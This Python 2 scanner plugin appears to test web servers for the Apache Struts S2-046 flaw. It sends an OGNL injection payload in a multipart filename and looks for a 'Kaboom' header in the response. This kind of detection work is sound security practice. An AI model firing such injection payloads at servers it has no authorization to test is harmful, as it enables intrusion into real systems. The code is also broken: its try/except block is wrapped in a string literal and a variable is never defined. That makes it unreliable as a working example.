#!/usr/bin/env python
# encoding: utf-8
# from ..t import T
from t import T
import requests
import sys
class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']
    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'

        result = {}
        timeout=3
        result['result']=False
        res=None
        payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
        try:
            '''
            headers = {}
            headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
            headers['Content-Length'] = '10000000'
            if productname.has_key('cookie'):
                headers['Cookie'] = productname['cookie']

            files = {
                'upload': (payload, 'Kaboom', 'text/plain')
            }
            r = requests.post(target_url, files=files, headers=headers)
            res_headers = dict(r.headers)
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
            '''
            
                
        if res_headers.has_key('X-Test') and res_headers['X-Test'] == 'Kaboom':


            info = target_url + "struts046 Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts046 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='www',port='8089')
            
            
            
            
